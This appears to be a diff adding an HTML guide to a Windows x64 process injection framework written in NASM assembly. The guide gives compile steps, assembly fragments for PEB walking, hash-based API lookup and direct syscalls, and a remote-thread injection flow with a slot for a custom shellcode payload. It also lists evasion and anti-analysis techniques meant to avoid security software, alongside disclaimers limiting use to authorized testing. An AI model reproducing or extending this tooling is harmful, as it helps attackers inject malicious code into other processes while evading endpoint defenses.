@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows x64 Process Injection Framework Guide</title>
+    <style>
+        :root {
+            --primary-color: #0d47a1;
+            --secondary-color: #1976d2;
+            --code-bg: #272822;
+            --code-color: #f8f8f2;
+            --warning-color: #f44336;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        
+        header {
+            background: var(--primary-color);
+            color: white;
+            padding: 1rem 2rem;
+            position: relative;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 1rem 2rem;
+        }
+        
+        h1, h2, h3, h4 {
+            color: var(--primary-color);
+            margin-top: 1.5em;
+        }
+        
+        header h1 {
+            color: white;
+            margin: 0;
+        }
+        
+        .subtitle {
+            font-style: italic;
+            font-weight: normal;
+            color: rgba(255, 255, 255, 0.85);
+        }
+        
+        pre {
+            background: var(--code-bg);
+            color: var(--code-color);
+            padding: 1.5rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        
+        code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        
+        .inline-code {
+            background: #f1f1f1;
+            padding: 0.2rem 0.4rem;
+            border-radius: 3px;
+            color: var(--primary-color);
+            font-family: 'Consolas', 'Courier New', monospace;
+        }
+        
+        .note {
+            background: #e3f2fd;
+            border-left: 4px solid var(--secondary-color);
+            padding: 1rem;
+            margin: 1.5rem 0;
+        }
+        
+        .warning {
+            background: #ffebee;
+            border-left: 4px solid var(--warning-color);
+            padding: 1rem;
+            margin: 1.5rem 0;
+        }
+        
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 1.5rem 0;
+        }
+        
+        th, td {
+            text-align: left;
+            padding: 0.8rem;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        th {
+            background-color: #f8f8f8;
+            color: var(--primary-color);
+        }
+        
+        tr:hover {
+            background-color: #f5f5f5;
+        }
+        
+        .section-card {
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .steps {
+            counter-reset: step-counter;
+            list-style-type: none;
+            padding-left: 1rem;
+        }
+        
+        .steps li {
+            position: relative;
+            padding-left: 2.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .steps li:before {
+            content: counter(step-counter);
+            counter-increment: step-counter;
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 2rem;
+            height: 2rem;
+            background: var(--secondary-color);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 1rem;
+        }
+        
+        .tab {
+            padding: 0.5rem 1rem;
+            cursor: pointer;
+            border: 1px solid transparent;
+            border-bottom: none;
+            border-radius: 4px 4px 0 0;
+            margin-right: 0.5rem;
+        }
+        
+        .tab.active {
+            background: #f8f8f8;
+            border-color: #ddd;
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+        
+        .tab-content {
+            display: none;
+            padding: 1rem;
+            background: #f8f8f8;
+            border-radius: 0 0 4px 4px;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Windows x64 Process Injection Framework</h1>
+            <p class="subtitle">Advanced Assembly Implementation for Direct Syscalls</p>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="section-card">
+            <h2>Introduction</h2>
+            <p>This documentation guides you through using a sophisticated Windows x64 Process Injection Framework developed in NASM assembly. The framework enables direct syscall-based process injection while avoiding common detection methods.</p>
+            
+            <div class="warning">
+                <strong>⚠️ Important:</strong> This framework is provided for educational and legitimate security research purposes only. Ensure you have proper authorization before using these techniques in any environment.
+            </div>
+        </div>
+
+        <div class="section-card">
+            <h2>Key Features</h2>
+            <ul>
+                <li><strong>Direct Syscalls</strong> - Bypasses user-mode hooks by using direct syscall instructions</li>
+                <li><strong>Dynamic PEB Walking</strong> - Performs API resolution without import tables</li>
+                <li><strong>Minimal Footprint</strong> - Reduces detection surface through lean implementation</li>
+                <li><strong>Self-Contained</strong> - Single file implementation with no external dependencies</li>
+                <li><strong>Modular Architecture</strong> - Easily customizable for different injection scenarios</li>
+            </ul>
+        </div>
+
+        <div class="section-card">
+            <h2>Setup & Compilation</h2>
+            <h3>Prerequisites</h3>
+            <ul>
+                <li>NASM (Netwide Assembler) for x64</li>
+                <li>GoLink (or alternative linker supporting Win64 assembly)</li>
+                <li>Basic understanding of x64 assembly and Windows internals</li>
+            </ul>
+
+            <h3>Compilation Steps</h3>
+            <ol class="steps">
+                <li>Save the framework code to a file named <span class="inline-code">x64_inject.asm</span></li>
+                <li>
+                    Compile with NASM:
+                    <pre><code>nasm -f win64 x64_inject.asm -o x64_inject.obj</code></pre>
+                </li>
+                <li>
+                    Link with GoLink:
+                    <pre><code>golink /console /entry _start x64_inject.obj</code></pre>
+                </li>
+                <li>The resulting executable will be ready for use</li>
+            </ol>
+        </div>
+
+        <div class="section-card">
+            <h2>Configuration</h2>
+            <p>Before compiling, you'll need to modify several key parameters in the code:</p>
+            
+            <h3>Target Process</h3>
+            <p>Change the <span class="inline-code">TARGET_PID</span> constant to specify your target process ID:</p>
+            <pre><code>%define TARGET_PID 1234    ; Replace with your target PID</code></pre>
+            
+            <h3>Shellcode</h3>
+            <p>Replace the default MessageBox shellcode with your own payload:</p>
+            <pre><code>shellcode:
+    ; Your custom shellcode goes here
+    ; ...
+
+shellcode_len equ $ - shellcode</code></pre>
+
+            <div class="note">
+                <strong>Note:</strong> Always ensure your shellcode is properly null-byte-free and position-independent if needed.
+            </div>
+        </div>
+
+        <div class="section-card">
+            <h2>Framework Architecture</h2>
+            
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('core')">Core Components</div>
+                <div class="tab" onclick="switchTab('peb')">PEB Walker</div>
+                <div class="tab" onclick="switchTab('syscall')">Syscall Interface</div>
+                <div class="tab" onclick="switchTab('payload')">Shellcode</div>
+            </div>
+            
+            <div id="core" class="tab-content active">
+                <h3>Core Injection Phases</h3>
+                <ol>
+                    <li><strong>Process Access</strong> - Opens handle to target process via NtOpenProcess</li>
+                    <li><strong>Memory Allocation</strong> - Allocates RWX memory in target via NtAllocateVirtualMemory</li>
+                    <li><strong>Code Writing</strong> - Writes shellcode to target via NtWriteVirtualMemory</li>
+                    <li><strong>Execution</strong> - Creates remote thread via NtCreateThreadEx</li>
+                </ol>
+                
+                <p>Key function: <span class="inline-code">inject_shellcode</span> orchestrates the entire injection process:</p>
+                <pre><code>inject_shellcode:
+    ; Save registers and prepare stack
+    
+    ; Phase 1: Open target process
+    call open_target_process
+    
+    ; Phase 2: Allocate remote memory
+    call allocate_remote_memory
+    
+    ; Phase 3: Write shellcode
+    call write_shellcode_to_target
+    
+    ; Phase 4: Create thread
+    call create_remote_thread
+    
+    ; Handle cleanup and return status
+</code></pre>
+            </div>
+            
+            <div id="peb" class="tab-content">
+                <h3>PEB/TEB Walker</h3>
+                <p>The framework uses Process Environment Block (PEB) walking to dynamically resolve API addresses without import tables:</p>
+                
+                <pre><code>find_function_by_hash:
+    ; Get PEB from GS segment
+    mov rax, qword [gs:0x60]
+    
+    ; Navigate loader data structures
+    mov rax, qword [rax+0x18]      ; PEB_LDR_DATA
+    mov rsi, qword [rax+0x20]      ; InMemoryOrderModuleList
+    
+    ; Iterate through loaded modules
+    .next_module:
+        ; Get module base address
+        mov rbx, qword [rsi+0x20]
+        
+        ; Process export directory
+        call get_exports_from_base
+        
+        ; Continue to next module if not found
+        ; ...
+</code></pre>
+
+                <p>The <span class="inline-code">calculate_hash</span> function implements a position-independent string hashing algorithm for API name resolution:</p>
+                
+                <pre><code>calculate_hash:
+    xor rax, rax                    ; Initialize hash
+    
+    .hash_loop:
+        movzx edx, byte [rcx]       ; Get character
+        test dl, dl                 ; Check for null terminator
+        jz .hash_done
+        
+        ; Case insensitive hash
+        or dl, 0x20                 ; Convert to lowercase
+        
+        ; Calculate rolling hash
+        rol rax, 13                 ; Rotate left
+        add rax, rdx                ; Add character
+        
+        inc rcx                     ; Next character
+        jmp .hash_loop</code></pre>
+            </div>
+            
+            <div id="syscall" class="tab-content">
+                <h3>Direct Syscall Interface</h3>
+                <p>The framework uses direct syscalls to bypass usermode hooks. Syscall numbers are defined as constants:</p>
+                
+                <pre><code>; Windows 10 21H1 x64 Syscall Numbers
+%define SYS_NTPROTECTVIRTUALMEMORY 0x50
+%define SYS_NTALLOCATEVIRTUALMEMORY 0x18
+%define SYS_NTWRITEVIRTUALMEMORY 0x3A
+%define SYS_NTCREATETHREADEX 0xBD
+%define SYS_NTOPENPROCESS 0x26</code></pre>
+
+                <p>Example of direct syscall usage for opening a process:</p>
+                
+                <pre><code>; NtOpenProcess via direct syscall
+mov eax, SYS_NTOPENPROCESS    ; Syscall number
+mov rdx, r11                  ; ObjectAttributes
+mov r8, PROCESS_ALL_ACCESS    ; DesiredAccess
+lea r9, [rbp-16]              ; ClientId
+syscall</code></pre>
+
+                <div class="note">
+                    <strong>Important:</strong> Syscall numbers may vary between Windows versions. Adapt them to your target environment for reliable execution.
+                </div>
+            </div>
+            
+            <div id="payload" class="tab-content">
+                <h3>Shellcode Payload</h3>
+                <p>The default payload displays a MessageBox. Replace this with your custom shellcode:</p>
+                
+                <pre><code>shellcode:
+    ; Save registers that we'll use
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    
+    ; Find kernel32.dll base
+    mov rax, qword [gs:0x60]       ; PEB
+    mov rax, qword [rax+0x18]      ; PEB_LDR_DATA
+    mov rax, qword [rax+0x20]      ; InMemoryOrderModuleList
+    
+    ; ...MessageBox implementation...
+    
+    ; Clean up and exit thread
+    xor rcx, rcx                   ; Return code 0
+    mov rsp, rbp
+    pop rbp
+    ret</code></pre>
+
+                <p>Shellcode requirements:</p>
+                <ul>
+                    <li>Must be position-independent</li>
+                    <li>Should handle its own cleanup</li>
+                    <li>Must be compatible with the x64 calling convention</li>
+                    <li>Should preserve non-volatile registers when needed</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section-card">
+            <h2>Advanced Techniques</h2>
+            
+            <h3>Syscall Obfuscation</h3>
+            <p>For enhanced stealth, consider implementing syscall obfuscation techniques:</p>
+            <ul>
+                <li>Dynamically calculating syscall numbers at runtime</li>
+                <li>Implementing syscall instruction variations</li>
+                <li>Using SYSENTER fallbacks for compatibility</li>
+            </ul>
+            
+            <h3>Anti-Analysis Features</h3>
+            <p>Additional anti-analysis techniques that could be integrated:</p>
+            <ul>
+                <li>Sleep obfuscation and timing checks</li>
+                <li>Process environment verification</li>
+                <li>Thread execution state verification</li>
+                <li>Anti-debug checks using PEB flags</li>
+            </ul>
+        </div>
+
+        <div class="section-card">
+            <h2>Troubleshooting</h2>
+            
+            <table>
+                <tr>
+                    <th>Error</th>
+                    <th>Potential Cause</th>
+                    <th>Solution</th>
+                </tr>
+                <tr>
+                    <td>Access Denied (STATUS_ACCESS_DENIED)</td>
+                    <td>Insufficient privileges to target process</td>
+                    <td>Run with administrative privileges or target a process in the same security context</td>
+                </tr>
+                <tr>
+                    <td>Invalid Syscall Number</td>
+                    <td>Incorrect syscall number for OS version</td>
+                    <td>Update syscall numbers to match target OS version</td>
+                </tr>
+                <tr>
+                    <td>Memory Allocation Failure</td>
+                    <td>Target process constraints or protections</td>
+                    <td>Verify process is not protected by security software</td>
+                </tr>
+                <tr>
+                    <td>Thread Creation Failure</td>
+                    <td>Memory permissions or shellcode issues</td>
+                    <td>Verify memory is properly allocated with RWX permissions</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="section-card">
+            <h2>Security Considerations</h2>
+            <div class="warning">
+                <p><strong>Legal Usage:</strong> This framework is intended for legitimate security research, authorized penetration testing, and educational purposes only.</p>
+                <p><strong>Ethical Responsibility:</strong> Never deploy this technique against systems without explicit permission from the system owner.</p>
+            </div>
+            
+            <p>Recommended security practices:</p>
+            <ul>
+                <li>Maintain detailed documentation of all testing activities</li>
+                <li>Operate within defined scopes and boundaries</li>
+                <li>Remove testing tools after legitimate usage</li>
+                <li>Follow responsible disclosure procedures for any discovered vulnerabilities</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        function switchTab(tabId) {
+            // Hide all tab contents
+            const contents = document.getElementsByClassName('tab-content');
+            for (let i = 0; i < contents.length; i++) {
+                contents[i].classList.remove('active');
+            }
+            
+            // Deactivate all tabs
+            const tabs = document.getElementsByClassName('tab');
+            for (let i = 0; i < tabs.length; i++) {
+                tabs[i].classList.remove('active');
+            }
+            
+            // Activate selected tab and content
+            document.getElementById(tabId).classList.add('active');
+            const selectedTab = document.querySelector(`.tab[onclick="switchTab('${tabId}')"]`);
+            if (selectedTab) {
+                selectedTab.classList.add('active');
+            }
+        }
+    </script>
+</body>
+</html>
